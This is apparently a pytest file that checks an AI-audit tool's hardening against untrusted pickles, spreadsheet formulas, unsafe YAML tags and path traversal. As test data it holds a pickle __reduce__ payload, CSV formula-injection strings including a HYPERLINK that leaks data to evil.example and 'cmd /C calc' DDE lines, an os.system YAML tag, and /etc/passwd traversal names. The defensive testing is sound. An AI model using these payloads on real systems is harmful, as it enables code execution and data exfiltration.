"""Untrusted inputs cannot run code on the auditor's machine or in a reviewer's tools.

Covers the 0.6.0 hardening: pickled models need a pin or an explicit trust decision,
.skops models load without unpickling, CSV exports cannot carry spreadsheet formulas,
the HTML report forbids scripts, oversized configuration is refused, and built-in probe
pack names cannot walk out of the package.
"""

from __future__ import annotations

import csv
import hashlib
import pickle
from pathlib import Path

import numpy as np
import pandas as pd
import pytest

from pramana.audit.engine import run_audit
from pramana.cli import main
from pramana.probes import ProbeFileError, load_probe_file
from pramana.reporting import _write_csv, write_outputs
from pramana.safeio import InputTooLarge, csv_safe, load_yaml
from pramana.spec import SpecError, UntrustedModelError, load_spec

EXIT_INPUT = 3


class _Exploit:
    """A pickle payload: unpickling it writes a marker file (stands in for any command)."""

    def __init__(self, marker: Path):
        self.marker = marker

    def __reduce__(self):
        return (Path.write_text, (self.marker, "pwned"))


def _tabular_spec(tmp_path: Path, model_name: str, extra: str = "") -> Path:
    rng = np.random.default_rng(0)
    n = 200
    df = pd.DataFrame(
        {
            "x1": rng.normal(size=n),
            "x2": rng.normal(size=n),
            "group": rng.choice(["A", "B"], size=n),
        }
    )
    df["label"] = (df["x1"] + rng.normal(scale=0.5, size=n) > 0).astype(int)
    df.to_csv(tmp_path / "eval.csv", index=False)
    spec = tmp_path / "audit.yaml"
    spec.write_text(
        "system: {name: M, version: '1', type: tabular_classifier, owner: R}\n"
        "use_case: {domain: other}\n"
        f"artifacts: {{model: {model_name}, evaluation_data: eval.csv}}\n"
        "target: label\nfeatures: [x1, x2]\nsensitive_features: [group]\n" + extra,
        encoding="utf-8",
    )
    return spec


# Pickled models --------------------------------------------------------------------------


def test_an_unpinned_pickle_is_refused_and_never_unpickled(tmp_path):
    marker = tmp_path / "marker.txt"
    (tmp_path / "model.joblib").write_bytes(pickle.dumps(_Exploit(marker)))
    spec_path = _tabular_spec(tmp_path, "model.joblib")

    with pytest.raises(UntrustedModelError):
        run_audit(load_spec(spec_path), tmp_path / "pack")
    assert main(["run", str(spec_path), "--out", str(tmp_path / "p")]) == EXIT_INPUT
    assert not marker.exists(), "the pickle payload ran"


def test_a_pinned_or_explicitly_trusted_pickle_is_loaded(tmp_path):
    import joblib
    from sklearn.linear_model import LogisticRegression

    spec_path = _tabular_spec(tmp_path, "model.joblib")
    df = pd.read_csv(tmp_path / "eval.csv")
    joblib.dump(LogisticRegression().fit(df[["x1", "x2"]], df["label"]), tmp_path / "model.joblib")
    digest = hashlib.sha256((tmp_path / "model.joblib").read_bytes()).hexdigest()

    pinned = _tabular_spec(tmp_path, "model.joblib", f"artifacts_sha256: {{model: '{digest}'}}\n")
    assert run_audit(load_spec(pinned), tmp_path / "pack1").results

    flagged = load_spec(spec_path)
    flagged.trust_pickled_model = True
    assert run_audit(flagged, tmp_path / "pack2").results
    assert (
        main(["run", str(spec_path), "--out", str(tmp_path / "p3"), "--no-gate", "--trust-model"])
        == 0
    )


def test_trust_must_be_a_literal_true(tmp_path):
    spec_path = _tabular_spec(tmp_path, "model.joblib", "trust_pickled_model: 'yes'\n")
    assert load_spec(spec_path).trust_pickled_model is False


def test_a_skops_model_loads_without_unpickling(tmp_path):
    sio = pytest.importorskip("skops.io")
    from sklearn.ensemble import GradientBoostingClassifier

    spec_path = _tabular_spec(tmp_path, "model.skops")
    df = pd.read_csv(tmp_path / "eval.csv")
    model = GradientBoostingClassifier(n_estimators=10).fit(df[["x1", "x2"]], df["label"])
    sio.dump(model, tmp_path / "model.skops")
    result = run_audit(load_spec(spec_path), tmp_path / "pack")
    perf = result.result("performance.discrimination")
    assert perf.status.value != "error", perf.summary


# Spreadsheet formulas --------------------------------------------------------------------


@pytest.mark.parametrize(
    "payload",
    [
        '=HYPERLINK("https://evil.example/?d="&A1,"click")',
        "+cmd|' /C calc'!A0",
        "@SUM(1+1)",
        "-2+3+cmd|' /C calc'!A0",
        "\t=1+1",
        "＝SUM(1)",
    ],
)
def test_formula_payloads_are_neutralised(payload):
    assert csv_safe(payload).startswith("'")


@pytest.mark.parametrize("value", ["-0.25", "+3", "12%", "plain text", "", 5, None])
def test_ordinary_values_are_unchanged(value):
    assert csv_safe(value) == value


def test_csv_exports_write_formulas_as_text(tmp_path):
    out = tmp_path / "r.csv"
    _write_csv(out, [{"a": "=1+1", "b": ["@x", "ok"]}], ["a", "b"])
    rows = list(csv.DictReader(out.open(encoding="utf-8")))
    assert rows[0]["a"] == "'=1+1"
    assert rows[0]["b"] == "'@x; ok"


# HTML report -----------------------------------------------------------------------------


def test_the_report_forbids_scripts_and_remote_loads(tmp_path, chatbot_audit):
    paths = write_outputs(chatbot_audit, tmp_path / "pack")
    html = paths["report"].read_text(encoding="utf-8")
    assert "Content-Security-Policy" in html
    assert "default-src 'none'" in html
    assert "script-src" not in html  # no script source is ever allowed


# Configuration files ---------------------------------------------------------------------


def test_oversized_yaml_is_refused(tmp_path):
    big = tmp_path / "big.yaml"
    big.write_text("a: " + "x" * 2000, encoding="utf-8")
    with pytest.raises(InputTooLarge):
        load_yaml(big, max_bytes=1000)


def test_a_spec_that_is_not_a_mapping_is_a_spec_error(tmp_path):
    p = tmp_path / "audit.yaml"
    p.write_text("- just\n- a list\n", encoding="utf-8")
    with pytest.raises(SpecError):
        load_spec(p)


def test_yaml_tags_cannot_build_python_objects(tmp_path):
    p = tmp_path / "audit.yaml"
    p.write_text("!!python/object/apply:os.system ['echo pwned']\n", encoding="utf-8")
    with pytest.raises(SpecError):
        load_spec(p)


@pytest.mark.parametrize("name", ["../../spec", "..%2Finjection_core", "/etc/passwd"])
def test_builtin_pack_names_cannot_escape_the_library(tmp_path, name):
    p = tmp_path / "probes.yaml"
    p.write_text(f"include: ['builtin:{name}']\n", encoding="utf-8")
    with pytest.raises(ProbeFileError, match="Unknown built-in"):
        load_probe_file(p)
